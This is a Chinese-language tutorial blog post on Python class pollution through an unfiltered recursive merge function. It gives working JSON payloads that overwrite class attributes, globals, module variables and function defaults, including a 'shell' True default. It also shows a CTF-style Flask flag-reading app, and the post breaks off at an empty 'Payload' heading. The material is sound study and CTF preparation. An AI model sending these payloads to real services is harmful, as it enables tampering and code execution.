<h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12518">xz.aliyun.com&#x2F;news&#x2F;12518</a></p>
<p><a target="_blank" rel="noopener" href="https://rycarl.cn/index.php/2025/04/28/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E4%BB%8E%E5%9F%BA%E7%A1%80%E5%88%B0%E6%B7%B1%E5%85%A5/">Python原型链污染从基础到深入 - Rycarls little blog</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Article-kelp/p/17068716.html">Python原型链污染变体(prototype-pollution-in-python) - Article_kelp - 博客园</a></p>
<h4 id="Python原型链污染"><a href="#Python原型链污染" class="headerlink" title="Python原型链污染"></a>Python原型链污染</h4><p>Python则是对类属性值的污染，且只能对类的属性来进行污染不能够污染类的方法</p>
<ul>
<li><strong>原型继承特性</strong><br>Python中每个对象通过<code>__class__</code>属性指向其所属类，类通过<code>__base__</code>属性指向父类。当访问对象属性时，若当前对象&#x2F;类中未定义，会沿原型链向上查找</li>
<li><strong>污染条件</strong><br>需要存在递归合并函数（如<code>merge</code>）且未对特殊属性过滤</li>
</ul>
<p>来看一段代码：(很典型的原型链污染标志)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure>

<p>然后对src中的键值对进行了遍历，然后检查dst中是否含有<code>__getitem__</code>属性，以此来判断dst是否为字典。如果存在的话，检测dst中是否存在属性k且value是否是一个字典，如果是的话，就继续嵌套merge对内部的字典再进行遍历，将对应的每个键值对都取出来。如果不存在的话就将src中的value的值赋值给dst对应的key的值</p>
<p>如果dst不含有getitem属性的话，那就说明dst不是一个字典，就直接检测dst中是否存在k的属性，并检测该属性值是否为字典，如果是的话就再通过merge函数进行遍历，将k作为dst，v作为src，继续取出v里面的键值对进行遍历</p>
<hr>
<p><code>__getitem__</code> 是一个特殊的方法。它是对象的索引操作符重载方法，主要用于定义当使用方括号 <code>[]</code> 对象访问元素时的行为。当你尝试访问像 <code>object[key]</code> 这样的元素时，Python 会调用 <code>__getitem__</code> 方法（索引如<code>my_list[0]</code>）</p>
<hr>
<h5 id="污染分析（经典例子）"><a href="#污染分析（经典例子）" class="headerlink" title="污染分析（经典例子）"></a>污染分析（经典例子）</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span> : <span class="string">&quot;world&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#hello</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#hello</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#world</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#world</span></span><br></pre></td></tr></table></figure>

<p>我们打断点看看</p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w7.png"></p>
<p>第一步的时候，由于dst中没有<code>__getitem__</code>属性，所以跳到elif进行</p>
<p>此时k变成<code>__class__</code>，v变成<code>&#123;&#39;__base__&#39;:&#123;&#39;secret&#39;:&#39;world&#39;&#125;&#125;</code></p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w8.png"> </p>
<p>然后从递归进入第二次循环，这次提取dst中的<code>__base__</code>给k，那么v就等于<code>&#123;&#39;secret&#39;:&#39;world&#39;&#125;</code></p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w9.png"></p>
<p>由于dst中没有<code>__getitem__</code>属性，所以跳到elif进行，递归进入第三次循环</p>
<p>此时k就应该等于secret，v等于secret</p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w10.png"></p>
<p>由于dst中没有<code>__getitem__</code>属性，所以跳到elif进行，但是这次的v也不再是个字典，所以跳到else中进行setattr的操作，这是成功将k,v赋值给father类中的键值对，成功污染</p>
<p>（实际上就是一层层向上爬）</p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w11.png"></p>
<p>当然，也有不能污染的，比如<strong>Object</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;__str__&quot;</span> : <span class="string">&quot;Polluted ~&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">merge(payload, <span class="built_in">object</span>)</span><br><span class="line"><span class="comment">#TypeError: can&#x27;t set attributes of built-in/extension type &#x27;object&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h5><h6 id="获取全局变量"><a href="#获取全局变量" class="headerlink" title="获取全局变量"></a>获取全局变量</h6><p><strong>原理</strong></p>
<p><code>__init__</code>作为类的一个内置方法，在没有被重写作为函数的时候，其数据类型会被当做装饰器，而装饰器的特点就是都具有一个全局属性<code>__globals__</code>属性，<code>__globals__</code> 属性是函数对象的一个属性，用于访问该函数所在模块的全局命名空间</p>
<p>可以用这一段来看</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">demo</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> :</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(demo.__globals__==<span class="built_in">globals</span>()==A.__init__.__globals__)</span><br></pre></td></tr></table></figure>

<p>接下面的例子</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">mihomo = <span class="number">114514</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Genshin</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Honkai</span>():</span><br><span class="line">    music = <span class="string">&quot;Proi&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ZZZ</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">StarRailway = ZZZ()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;mihomo&quot;</span> : <span class="number">1919810</span>,</span><br><span class="line">                <span class="string">&quot;Honkai&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;music&quot;</span> : <span class="string">&quot;jiaojiao&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Honkai.music)</span><br><span class="line"><span class="built_in">print</span>(mihomo)</span><br><span class="line"></span><br><span class="line">merge(payload,StarRailway)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Honkai.music)</span><br><span class="line"><span class="built_in">print</span>(mihomo)</span><br></pre></td></tr></table></figure>

<p>成功获取并污染全局变量</p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w12.png"></p>
<h6 id="sys模块加载"><a href="#sys模块加载" class="headerlink" title="sys模块加载"></a>sys模块加载</h6><p><code>sys</code>模块的<code>modules</code>属性以字典的形式包含了程序自开始运行时所有已加载过的模块，可以直接从该属性中获取到目标模块</p>
<p>这里给到两个模块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test_1.py</span></span><br><span class="line"></span><br><span class="line">secret_var = <span class="number">114</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target_class</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;secret&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后另一个模块导入这一模块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> test_1</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;sys&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;modules&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;test_1&quot;</span> : &#123;</span><br><span class="line">                        <span class="string">&quot;secret_var&quot;</span> : <span class="number">514</span>,</span><br><span class="line">                        <span class="string">&quot;target_class&quot;</span> : &#123;</span><br><span class="line">                            <span class="string">&quot;secret_class_var&quot;</span> : <span class="string">&quot;Poluuuuuuted ~&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#secret</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#114</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#514</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#Poluuuuuuted ~</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6 id="加载器loader获取"><a href="#加载器loader获取" class="headerlink" title="加载器loader获取"></a>加载器loader获取</h6><p>loader加载器在python中的作用是为实现模块加载而设计的类，其在<code>importlib</code>这一内置模块中有具体实现。而<code>importlib</code>模块下所有的<code>py</code>文件中均引入了<code>sys</code>模块，这样我们和上面的sys模块获取已加载模块就联系起来了，所以我们的目标就变成了只要获取了加载器loader，我们就可以通过<code>loader.__init__.__globals__[&#39;sys&#39;]</code>来获取到sys模块，然后再获取到我们想要的模块</p>
<p>对于一个模块来说，模块中的一些内置属性会在被加载时自动填充</p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w13.png"></p>
<p><code>__loader__</code>内置属性会被赋值为加载该模块的<code>loader</code>，这样只要能获取到任意的模块便能通过<code>__loader__</code>属性获取到<code>loader</code>，而且对于<code>python3</code>来说除了在<code>debug</code>模式下的主文件中<code>__loader__</code>为<code>None</code>以外，正常执行的情况每个模块的<code>__loader__</code>属性均有一个对应的类</p>
<p>另外Python还存在一个<code>__spec__</code>内置函数，包含了关于类加载时候的信息，可以直接用</p>
<p><code>&lt;模块名&gt;.__spec__.__init__.__globals__[&#39;sys&#39;]</code>获取到<code>sys</code>模块</p>
<h6 id="形参默认值替换"><a href="#形参默认值替换" class="headerlink" title="形参默认值替换"></a>形参默认值替换</h6><p>分为<code>__defaults__</code>和<code>__kwdefaults__</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>(<span class="params">var_1, var_2 =<span class="number">2</span>, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(a.__defaults__)</span><br><span class="line"><span class="comment">#(2, 3)</span></span><br></pre></td></tr></table></figure>

<p>（Python中带有默认值的参数必须位于不带默认值的参数之后）</p>
<p>元组：（<strong>有序的、不可变的序列类型</strong>）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">my_tuple = (<span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;hello&quot;</span>, [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"><span class="built_in">print</span>(my_tuple[<span class="number">0</span>])  <span class="comment"># 输出 1</span></span><br><span class="line"><span class="built_in">print</span>(my_tuple[-<span class="number">1</span>])  <span class="comment"># 输出 [3, 4, 5]</span></span><br></pre></td></tr></table></figure>

<p>然后就是可以对函数进行默认值的替换</p>
<p>前提是要替换的值是元组的形式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            &quot;demo&quot; : &#123;</span><br><span class="line">                &quot;__defaults__&quot; : (True,)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另一个则是以字典形式替换：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            &quot;demo&quot; : &#123;</span><br><span class="line">                &quot;__kwdefaults__&quot; : &#123;</span><br><span class="line">                    &quot;shell&quot; : True</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h6 id="got-first-request："><a href="#got-first-request：" class="headerlink" title="_got_first_request："></a>_got_first_request：</h6><p>用于判定是否某次请求为自<code>Flask</code>启动后第一次请求，是<code>Flask.got_first_request</code>函数的返回值，此外还会影响装饰器<code>app.before_first_request</code>的调用，而<code>_got_first_request</code>值为假时才会调用：</p>
<p>所以如果我们想调用第一次访问前的请求，还想要在后续请求中进行使用的话，我们就需要将<code>_got_first_request</code>从true改成false然后就能够在后续访问的过程中，仍然能够调用装饰器<code>app.before_first_request</code>下面的可用信息：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;Is flag here?&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(app, <span class="string">&quot;special&quot;</span>) <span class="keyword">and</span> app.special == <span class="string">&quot;U_Polluted_It&quot;</span>:</span><br><span class="line">        flag = <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;rt&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="built_in">setattr</span>(app, <span class="string">&quot;special&quot;</span>, <span class="string">&quot;U_Polluted_It&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>before_first_request</code>修饰的<code>init</code>函数只会在第一次访问前被调用，而其中读取<code>flag</code>的逻辑又需要访问路由<code>/</code>后才能触发，这就构成了矛盾。所以需要使用<code>payload</code>在访问<code>/</code>后重置<code>_got_first_request</code>属性值为假，这样<code>before_first_request</code>才会再次调用</p>
<p>Payload：</p>
